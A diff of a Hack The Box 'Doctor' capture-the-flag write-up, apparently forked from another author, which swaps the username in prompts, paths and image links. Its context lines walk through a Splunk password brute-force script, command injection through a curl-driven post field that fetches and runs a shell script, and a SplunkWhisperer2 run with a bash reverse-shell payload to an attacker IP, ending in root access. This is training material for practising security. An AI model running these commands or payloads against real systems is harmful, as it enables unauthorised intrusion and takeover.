@@ -9,6 +9,7 @@ avatar: assets/htb/doctor.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Doctor
 ---
+
 ## Enumeration
 
 ### Nmap scan
@@ -16,7 +17,7 @@ htb_url: https://app.hackthebox.com/machines/Doctor
 I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/doctor]
+┌──(kac0㉿kali)-[~/htb/doctor]
 └─$ nmap -sCV -n -p- -Pn -v -oA doctor <YOUR_IP>                                              130 ⨯
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-07 17:55 EST
@@ -94,21 +95,21 @@ Only three ports open: 22 - SSH, 80 - HTTP, and 8089 - Splunk
 
 ### Port 80 - HTTP
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-http-doctor.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-http-doctor.png)
 
 on port 80 found Health Care website; contact information including domain info@doctors.htb
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-http-doctor-usernames.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-http-doctor-usernames.png)
 
 Further down the page found some potential usernames: Dr. Jade Guzman, Dr. Hannah Ford, Dr. James Wilson
 
 ### Port 8089 - Splunk
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-splunkd.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-splunkd.png)
 
 Needed to use https. After accepting the security warnings about the self-signed certificates was led to a Splunk Atom Feed.  Says Splunk build: 8.0.5
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-splunkd-login.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-splunkd-login.png)
 
 I tried clicking on the services link, but was prompted to enter credentials
 
@@ -145,7 +146,7 @@ requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 print("Starting password brute force...\n")
 
-with open("/home/zweilos/rockyou_utf8.txt", "r") as rockyou:
+with open("/home/kac0/rockyou_utf8.txt", "r") as rockyou:
     for password in rockyou:
             r = requests.get('https://<YOUR_IP>:8089/services', auth=('admin', password), headers = headers, verify = False)
             if r.status_code == 200:
@@ -159,44 +160,44 @@ print("Thank you for using this service!\n")
 
 Brute force does not seem to get me anywhere
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-doctor-htb.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-doctor-htb.png)
 
 Next I tried navigating to doctors.htb...and got redirected to a login page
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-doctor-htb2.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-doctor-htb2.png)
 
 Testing for SQLi gives me an error " Nope, no such luck. "
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-doctor-htb3-archive.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-doctor-htb3-archive.png)
 
 found link to /archive in source code,
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-doctor-htb3-archive2.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-doctor-htb3-archive2.png)
 
  this page is blank with no content
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-doctor-htb4-register.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-doctor-htb4-register.png)
 
 Registered for an account
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-doctor-htb4.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-doctor-htb4.png)
 
 After I created an account, I noticed a banner at the top of the page warning me that I would only have 20 minutes for it to live.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-doctor-htb5-xsstest.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-doctor-htb5-xsstest.png)
 
 I tried some basic tests for XSS
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-doctor-htb5-xsstest2.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-doctor-htb5-xsstest2.png)
 
 I could see my post, but no alert after I opened it.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-doctor-htb5-xsstest3.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-doctor-htb5-xsstest3.png)
 
 I tried putting a link to my machine in the Content box, but got a message that the link I posted was not valid, but I still got a connection back to my machine
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/doctor]
+┌──(kac0㉿kali)-[~/htb/doctor]
 └─$ nc -lvnp 8081
 listening on [any] 8081 ...
 connect to [10.10.15.77] from (UNKNOWN) [<YOUR_IP>] 39234
@@ -208,10 +209,10 @@ Accept: */*
 
 Looks like the service is running `curl`. If there is no input sanitization I may be able to get code execution here.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-doctor-htb5-xsstest4.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-doctor-htb5-xsstest4.png)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/doctor]
+┌──(kac0㉿kali)-[~/htb/doctor]
 └─$ nc -lvnp 8081                                                                                130 ⨯
 listening on [any] 8081 ...
 connect to [10.10.15.77] from (UNKNOWN) [<YOUR_IP>] 39242
@@ -233,12 +234,12 @@ Didn't work
 
 in bash $IFS is a space by default
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-burp.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-burp.png)
 
 After discovering that I could use commands by plugging the space with `$IFS`, I sent a lot of different commands trying to enumerate the machine.  \(As you can see below, I only got very limited information back from each attempt.\)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/doctor]
+┌──(kac0㉿kali)-[~/htb/doctor]
 └─$ python3 -m http.server 8081
 Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
 <YOUR_IP> - - [07/Feb/2021 21:19:26] code 404, message File not found
@@ -273,11 +274,11 @@ Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
 
 I figured out how to enumerate `/etc/passwd` one line at a time using `tail -n`;
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-wireshark.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-wireshark.png)
 
 I hoped that perhaps I could see more of the output in Wireshark, but unfortunately I could not.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-burp-shaun.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-burp-shaun.png)
 
  I found a username `shaun` using `tail -n2`.  Next, I tried to see if I could send my SSH key to `shaun`'s`authorized_keys` file but it didn't work.  After that I decided to try to get a reverse shell by sending a bash script and then executing it.
 
@@ -298,19 +299,19 @@ title=Passwd+Extract&content=http%3a//10.10.15.13%3a8081/$(bash$IFS'/dev/shm/she
 
 The three commands I sent through burp traffic: 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-burp-shell.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-burp-shell.png)
 
 sending the file using curl, 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-shell.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-shell.png)
 
 I verified that the file was there and accessible.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-burp-shell2.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-burp-shell2.png)
 
 chmod +x to make executable, 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-burp-shell3.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-burp-shell3.png)
 
 and executing my shell script
 
@@ -331,7 +332,7 @@ I got a connection back from the remote host which downloaded my shell script
 ## Road to User
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/doctor]
+┌──(kac0㉿kali)-[~/htb/doctor]
 └─$ nc -lvnp 8091                                                                                   1 ⨯
 listening on [any] 8091 ...
 connect to [10.10.15.13] from (UNKNOWN) [<YOUR_IP>] 51260
@@ -452,7 +453,7 @@ web@doctor:~$
 
 `adm` group can access process files and logs in /var/log
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-shell-pass.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-shell-pass.png)
 
 ```text
 web@doctor:/var/log$ grep password * 2>/dev/null
@@ -479,7 +480,7 @@ auth.log.1:Sep 22 13:01:28 doctor sshd[1704]: Failed password for invalid user s
 
 There were no useful hits for the word 'password' in these log files.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-shell-pass-backup.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-shell-pass-backup.png)
 
 ```text
 web@doctor:/var/log/apache2$ grep -i pass * 2>/dev/null
@@ -538,7 +539,7 @@ drwxrwxr-x 3 shaun shaun 4096 Sep  6 18:01 .local
 -r-------- 1 shaun shaun   33 Feb 12 07:04 user.txt
 shaun@doctor:~$ cat user.txt    
 cat user.txt
-d1d5****ffad
+d1d5************************ffad
 ```
 
 ## Path to Power \(Gaining Administrator Access\)
@@ -556,7 +557,7 @@ Sorry, user shaun may not run sudo on doctor.
 Could not use `sudo` as this user.  However, now that I had credentials, I could potentially use the exploit for splunkd that I had found earlier...
 
 ```sql
-┌──(zweilos㉿kali)-[~/htb/doctor]
+┌──(kac0㉿kali)-[~/htb/doctor]
 └─$ sqlite3 site.db .dump                                                                          1 ⨯
 PRAGMA foreign_keys=OFF;
 BEGIN TRANSACTION;
@@ -589,7 +590,7 @@ Found a password hash in the file `site.db`. I was unable to crack it with hashc
 * [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) 
 * [https://github.com/cnotin/SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/6-splunk-login.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-splunk-login.png)
 
 Was able to use `shaun`'s credentials to log into `/services` page on the Splunk site.
 
@@ -612,7 +613,7 @@ options = parser.parse_args()
 In the exploit I had to configure some parameters
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/doctor]
+┌──(kac0㉿kali)-[~/htb/doctor]
 └─$ python3 PySplunkWhisperer2_remote.py.1 --host doctors.htb --lhost 10.10.15.13 --lport 9001 --username shaun --password Guitar123 --payload "bash -c 'bash -i >& /dev/tcp/10.10.15.13/8092 0>&1'"
 Running in remote mode (Remote Code Execution)
 [.] Authenticating...
@@ -630,7 +631,7 @@ Press RETURN to cleanup
 ### Root.txt
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/doctor]
+┌──(kac0㉿kali)-[~/htb/doctor]
 └─$ nc -lvnp 8092                                                                                   1 ⨯
 listening on [any] 8092 ...
 connect to [10.10.15.13] from (UNKNOWN) [<YOUR_IP>] 42328
@@ -644,5 +645,5 @@ root@doctor:/# cd /root
 cd /root
 root@doctor:/root# cat root.txt
 cat root.txt
-3ce7****649f
+3ce7************************649f
 ```
